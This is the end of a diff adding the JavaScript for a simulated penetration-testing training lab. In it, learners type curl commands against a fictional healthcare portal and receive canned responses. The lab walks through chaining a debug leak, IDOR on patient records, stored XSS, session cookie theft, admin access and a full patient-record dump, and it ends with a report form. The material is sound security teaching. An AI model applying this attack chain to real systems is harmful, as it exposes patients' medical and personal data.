+            '<div class="obj-number">' + (done ? '&#10003;' : (obj.id + 1)) + '</div>' +
+            '<div style="flex:1;min-width:0;">' +
+            '<div class="obj-text">' + obj.text + '</div>' + hintHtml + '</div>';
+        dom.objList.appendChild(div);
+    });
+}
+
+/* ── Print Helpers ─────────────────────────────────────────── */
+function print(text, cls) {
+    cls = cls || 't-info';
+    var line = document.createElement('div');
+    line.className = 'output-line ' + cls;
+    if (cls === 't-blank') { line.innerHTML = '&nbsp;'; }
+    else { line.textContent = text; }
+    dom.output.appendChild(line);
+    dom.output.scrollTop = dom.output.scrollHeight;
+}
+function printHtml(html) {
+    var line = document.createElement('div');
+    line.className = 'output-line t-info';
+    line.innerHTML = html;
+    dom.output.appendChild(line);
+    dom.output.scrollTop = dom.output.scrollHeight;
+}
+function printBlank() { print('', 't-blank'); }
+function printCmd(cmd) { printBlank(); print('pentester@kali:~$ ' + cmd, 't-cmd'); }
+
+/* ── Welcome ───────────────────────────────────────────────── */
+function printWelcome() {
+    var lines = [
+        '   ____ _   _    _    ___ _   _  ',
+        '  / ___| | | |  / \\  |_ _| \\ | | ',
+        ' | |   | |_| | / _ \\  | ||  \\| | ',
+        ' | |___|  _  |/ ___ \\ | || |\\  | ',
+        '  \\____|_| |_/_/   \\_\\___|_| \\_| ',
+        '                                   ',
+        '  Bug Chaining Lab  v1.0           ',
+        '  Target: MedPortal Healthcare     '
+    ];
+    lines.forEach(function(l) { print(l, 't-accent'); });
+    printBlank();
+    print('Target: https://medportal.health (simulated healthcare web application)', 't-dim');
+    print('Your session: Patient ID 1003 (standard user, no admin access)', 't-dim');
+    printBlank();
+    print('Mission: Find 3 individual bugs, chain them together for full compromise,', 't-accent');
+    print('then document the chain in a formal report.', 't-accent');
+    printBlank();
+    print('Type  help       for available commands.', 't-accent');
+    print('Type  objectives to review lab objectives.', 't-accent');
+    print('Type  report     to open the chain summary report form.', 't-accent');
+    print('Hints cost 5 points each. Base score: 100 pts.', 't-warn');
+    printBlank();
+}
+
+/* ── Input Handling ────────────────────────────────────────── */
+function handleKeyDown(e) {
+    if (e.key === 'ArrowUp') {
+        e.preventDefault();
+        if (state.historyIndex > 0) { state.historyIndex--; dom.input.value = state.commandHistory[state.historyIndex]; }
+    } else if (e.key === 'ArrowDown') {
+        e.preventDefault();
+        if (state.historyIndex < state.commandHistory.length - 1) { state.historyIndex++; dom.input.value = state.commandHistory[state.historyIndex]; }
+        else { state.historyIndex = state.commandHistory.length; dom.input.value = ''; }
+    } else if (e.key === 'Enter') {
+        submitCommand();
+    }
+}
+
+function submitCommand() {
+    var raw = dom.input.value.trim();
+    dom.input.value = '';
+    if (!raw) return;
+    state.commandHistory.push(raw);
+    state.historyIndex = state.commandHistory.length;
+    printCmd(raw);
+    processCommand(raw);
+}
+
+/* ── Command Processing ────────────────────────────────────── */
+function processCommand(raw) {
+    var parts = raw.split(/\s+/);
+    var cmd = parts[0].toLowerCase();
+
+    if (cmd === 'clear') { dom.output.innerHTML = ''; return; }
+    if (cmd === 'help') { printHelp(); return; }
+    if (cmd === 'objectives') { showObjectivesInTerminal(); return; }
+    if (cmd === 'report') { switchToReport(); return; }
+
+    if (cmd === 'curl') {
+        processCurl(raw);
+        return;
+    }
+
+    if (cmd === 'nmap') {
+        print('This lab focuses on web application testing. Use curl to interact with MedPortal API endpoints.', 't-warn');
+        return;
+    }
+
+    print('Command not found: ' + cmd + '. Type "help" for available commands.', 't-err');
+}
+
+/* ── Curl Processing ───────────────────────────────────────── */
+function processCurl(raw) {
+    var isPost = raw.includes('-X POST') || raw.includes('-X post') || raw.includes('--data') || raw.includes('-d ');
+    var hasCookie = raw.includes('Cookie') || raw.includes('cookie') || raw.includes('-b ');
+
+    /* Objective 1: Debug endpoint */
+    if (raw.includes('/api/debug')) {
+        state.debugFound = true;
+        printApiResponse(API_RESPONSES.debug);
+        printBlank();
+        print('[!] VULNERABILITY: Debug endpoint exposed in production. Leaks user IDs, database connection strings, and internal endpoints.', 't-warn');
+        completeObjective(0);
+        updateChain('chain-info');
+
+        /* Auto-complete obj 1 (find user IDs) since they are in the response */
+        setTimeout(function() {
+            completeObjective(1);
+        }, 1200);
+        return;
+    }
+
+    /* Objective 3: IDOR on patient records */
+    if (raw.includes('/api/patients/1002')) {
+        state.idorFound = true;
+        printApiResponse(API_RESPONSES.patient_1002);
+        printBlank();
+        print('[!] VULNERABILITY: IDOR -- Accessed patient 1002 (Sarah Mitchell) records as patient 1003. No authorization check.', 't-warn');
+        print('[!] PHI EXPOSED: SSN, medical conditions, medications, emergency contacts.', 't-err');
+        completeObjective(2);
+        updateChain('chain-idor');
+        return;
+    }
+
+    if (raw.includes('/api/patients/1003') || (raw.includes('/api/patients') && !raw.includes('/notes') && !raw.includes('/1002') && !raw.includes('/1004') && !raw.includes('/1005') && !isPost && !raw.includes('/admin'))) {
+        printApiResponse(API_RESPONSES.patient_self);
+        return;
+    }
+
+    if (raw.match(/\/api\/patients\/100[45]/)) {
+        state.idorFound = true;
+        var otherId = raw.includes('1004') ? '1004' : '1005';
+        var otherName = otherId === '1004' ? 'Robert Chen' : 'Maria Gonzalez';
+        print('HTTP/1.1 200 OK', 't-info');
+        print('Content-Type: application/json', 't-dim');
+        printBlank();
+        print('{"id": ' + otherId + ', "name": "' + otherName + '", "ssn": "***-**-****", ...}', 't-info');
+        print('[!] IDOR confirmed on patient ' + otherId + ' as well.', 't-warn');
+        if (!state.completedObjectives.has(2)) { completeObjective(2); updateChain('chain-idor'); }
+        return;
+    }
+
+    /* Objective 4: XSS in patient notes */
+    if (raw.includes('/api/patients/notes') && isPost && (raw.includes('script') || raw.includes('<') || raw.includes('xss') || raw.includes('alert') || raw.includes('onerror') || raw.includes('img'))) {
+        state.xssFound = true;
+        printApiResponse(API_RESPONSES.xss_response);
+        printBlank();
+        print('[!] VULNERABILITY: Stored XSS -- Script payload saved to patient notes without sanitization.', 't-warn');
+        print('[!] Any user (including admins) viewing this note will execute the attacker payload.', 't-err');
+        completeObjective(3);
+        updateChain('chain-xss');
+        return;
+    }
+
+    if (raw.includes('/api/patients/notes') && isPost) {
+        print('HTTP/1.1 201 Created', 't-info');
+        print('{"success": true, "note_id": 4472, "message": "Patient note saved."}', 't-info');
+        print('[*] Note saved but no XSS payload detected. Try including a <script> tag in the note body.', 't-dim');
+        return;
+    }
+
+    /* Objective 5: Session theft */
+    if (raw.includes('steal-session') || raw.includes('steal_session') || raw.includes('exfiltrate')) {
+        state.sessionStolen = true;
+        printApiResponse(API_RESPONSES.session_theft);
+        printBlank();
+        print('[!] CHAIN LINK: XSS payload executed in admin browser. Admin session cookie stolen via exfiltration.', 't-warn');
+        print('[!] Admin session JWT decoded: uid=1001, role=admin', 't-err');
+        completeObjective(4);
+        updateChain('chain-session');
+        return;
+    }
+
+    /* Objective 6: Admin dashboard with stolen cookie */
+    if (raw.includes('/api/admin/dashboard') && hasCookie) {
+        state.adminAccess = true;
+        printApiResponse(API_RESPONSES.admin_dashboard);
+        printBlank();
+        print('[!] CHAIN LINK: Admin dashboard accessed using stolen session cookie.', 't-warn');
+        print('[!] Full admin access: 12,847 patient records, export functionality, audit logs.', 't-err');
+        completeObjective(5);
+        return;
+    }
+
+    if (raw.includes('/api/admin') && !hasCookie) {
+        print('HTTP/1.1 401 Unauthorized', 't-err');
+        print('{"error": "Authentication required. Include admin session cookie."}', 't-info');
+        print('[*] You need the stolen admin cookie. Use -H "Cookie: session=..." or -b "session=..."', 't-dim');
+        return;
+    }
+
+    /* Objective 7: Full dump */
+    if (raw.includes('/api/admin/export')) {
+        state.dumpComplete = true;
+        printApiResponse(API_RESPONSES.patient_dump);
+        printBlank();
+        print('[!] FULL CHAIN COMPLETE: All 12,847 patient records accessible via admin IDOR.', 't-err');
+        print('[!] HIPAA VIOLATION: Complete PHI/PII exposure -- SSNs, medical conditions, contact info.', 't-err');
+        print('[!] Chain: Info Disclosure -> IDOR -> XSS -> Session Theft -> Admin Access -> Full Data Dump', 't-warn');
+        completeObjective(6);
+        updateChain('chain-full');
+        return;
+    }
+
+    /* Catch-all for medportal URLs */
+    if (raw.includes('medportal')) {
+        print('HTTP/1.1 404 Not Found', 't-err');
+        print('{"error": "Endpoint not found. Check /api/debug for available endpoints."}', 't-info');
+        return;
+    }
+
+    print('curl: Could not resolve host. Target is https://medportal.health', 't-err');
+}
+
+/* ── API Response Printer ──────────────────────────────────── */
+function printApiResponse(resp) {
+    print('HTTP/1.1 ' + resp.status + (resp.status === 200 ? ' OK' : resp.status === 201 ? ' Created' : ''), 't-info');
+    resp.headers.split('\n').forEach(function(h) { print(h, 't-dim'); });
+    printBlank();
+    resp.body.split('\n').forEach(function(line) { print(line, 't-info'); });
+}
+
+/* ── Chain Visualization ───────────────────────────────────── */
+function updateChain(stepId) {
+    var el = document.getElementById(stepId);
+    if (el) el.classList.add('found');
+}
+
+/* ── Objective Management ──────────────────────────────────── */
+function completeObjective(id) {
+    if (state.completedObjectives.has(id)) return;
+    state.completedObjectives.add(id);
+    renderObjectives();
+    updateProgress();
+    showToast(OBJECTIVES[id].text);
+
+    /* Check if all 8 are done */
+    if (state.completedObjectives.size === OBJECTIVES.length) {
+        setTimeout(function() { showCompletion(); }, 1500);
+    }
+}
+
+function useHint(id) {
+    if (state.hintUsed.has(id) || state.completedObjectives.has(id)) return;
+    state.hintUsed.add(id);
+    state.score = Math.max(0, state.score - 5);
+    dom.scoreDisplay.textContent = state.score;
+    renderObjectives();
+    printBlank();
+    print('[HINT -5 pts] ' + OBJECTIVES[id].hint, 't-warn');
+}
+
+function updateProgress() {
+    var pct = Math.round((state.completedObjectives.size / OBJECTIVES.length) * 100);
+    dom.progressBar.style.width = pct + '%';
+    dom.progressLabel.textContent = state.completedObjectives.size + ' / ' + OBJECTIVES.length + ' completed';
+    dom.scoreDisplay.textContent = state.score;
+}
+
+function showToast(text) {
+    dom.objToastText.textContent = text;
+    dom.objToast.classList.add('show');
+    setTimeout(function() { dom.objToast.classList.remove('show'); }, 3500);
+}
+
+/* ── Report Form (Objective 8) ─────────────────────────────── */
+function switchToReport() {
+    dom.terminalPanel.classList.add('hidden');
+    dom.reportPanel.classList.add('active');
+}
+
+function switchToTerminal() {
+    dom.reportPanel.classList.remove('active');
+    dom.terminalPanel.classList.remove('hidden');
+    dom.input.focus();
+}
+
+function submitReport() {
+    var title = document.getElementById('reportTitle').value.trim();
+    var chain = document.getElementById('reportChain').value.trim();
+    var impact = document.getElementById('reportImpact').value.trim();
+    var cvss = document.getElementById('reportCvss').value.trim();
+    var severity = document.getElementById('reportSeverity').value;
+    var remediation = document.getElementById('reportRemediation').value.trim();
+
+    /* Validate all fields */
+    var errors = [];
+    if (!title || title.length < 10) errors.push('Title must be at least 10 characters.');
+    if (!chain || chain.length < 30) errors.push('Chain description must be at least 30 characters.');
+    if (!impact || impact.length < 20) errors.push('Impact statement must be at least 20 characters.');
+    if (!cvss || isNaN(parseFloat(cvss)) || parseFloat(cvss) < 0 || parseFloat(cvss) > 10) errors.push('CVSS must be a number between 0.0 and 10.0.');
+    if (!severity) errors.push('Select a severity rating.');
+    if (!remediation || remediation.length < 20) errors.push('Remediation recommendations must be at least 20 characters.');
+
+    if (errors.length > 0) {
+        alert('Please fix the following:\n\n' + errors.join('\n'));
+        return;
+    }
+
+    /* Report accepted */
+    state.reportSubmitted = true;
+    document.getElementById('reportSubmitBtn').disabled = true;
+    document.getElementById('reportSubmitBtn').textContent = 'Report Submitted';
+
+    completeObjective(7);
+
+    /* Switch back to terminal with confirmation */
+    setTimeout(function() {
+        switchToTerminal();
+        printBlank();
+        print('=== Chain Summary Report Submitted ===', 't-accent');
+        print('Title: ' + title, 't-info');
+        print('CVSS: ' + cvss + ' (' + severity.toUpperCase() + ')', 't-info');
+        print('Status: Accepted', 't-port');
+        printBlank();
+    }, 1000);
+}
+
+/* ── Completion ────────────────────────────────────────────── */
+function showCompletion() {
+    dom.finalScore.textContent = state.score;
+    dom.completionModal.classList.add('show');
+}
+
+function completeLab() {
+    try {
+        if (typeof ModuleProgress !== 'undefined') {
+            ModuleProgress.complete('dark-arts', 'bh-lab-chaining', { returnUrl: '../index.html' });
+        }
+    } catch (e) { /* non-fatal */ }
+
+    try {
+        if (typeof AchievementManager !== 'undefined') {
+            if (state.score >= 90) AchievementManager.unlock('chain_master');
+            if (state.completedObjectives.size === OBJECTIVES.length) AchievementManager.unlock('full_chain');
+            if (state.reportSubmitted) AchievementManager.unlock('report_writer');
+        }
+    } catch (e) { /* non-fatal */ }
+}
+
+/* ── Help ──────────────────────────────────────────────────── */
+function printHelp() {
+    printBlank();
+    print('=== Bug Chaining Lab - Available Commands ===', 't-accent');
+    printBlank();
+    print('WEB TESTING:', 't-accent');
+    print('  curl <url>                  HTTP GET request', 't-info');
+    print('  curl -X POST <url> -d \'...\' HTTP POST with data', 't-info');
+    print('  curl -H "Header: val" <url> Custom headers (for cookies)', 't-info');
+    print('  curl -b "cookie=val" <url>  Set cookies', 't-info');
+    printBlank();
+    print('LAB:', 't-accent');
+    print('  objectives                  Show current objectives', 't-info');
+    print('  report                      Open chain summary report form', 't-info');
+    print('  clear                       Clear terminal', 't-info');
+    print('  help                        This help message', 't-info');
+    printBlank();
+    print('TARGET: https://medportal.health', 't-warn');
+    print('KNOWN ENDPOINTS: /api/debug, /api/patients/:id, /api/patients/notes, /api/admin/dashboard', 't-dim');
+    printBlank();
+}
+
+function showObjectivesInTerminal() {
+    printBlank();
+    print('=== Lab Objectives ===', 't-accent');
+    OBJECTIVES.forEach(function(obj) {
+        var status = state.completedObjectives.has(obj.id) ? '[DONE]' : '[    ]';
+        var cls = state.completedObjectives.has(obj.id) ? 't-port' : 't-info';
+        print('  ' + status + ' ' + (obj.id + 1) + '. ' + obj.text, cls);
+    });
+    printBlank();
+}
+
+function clearTerminal() { dom.output.innerHTML = ''; }
+
+/* ── Boot ──────────────────────────────────────────────────── */
+document.addEventListener('DOMContentLoaded', init);
+</script>
+
+<script src="../../../../components/FluxCapacitor.js"></script>
+</body>
+</html>
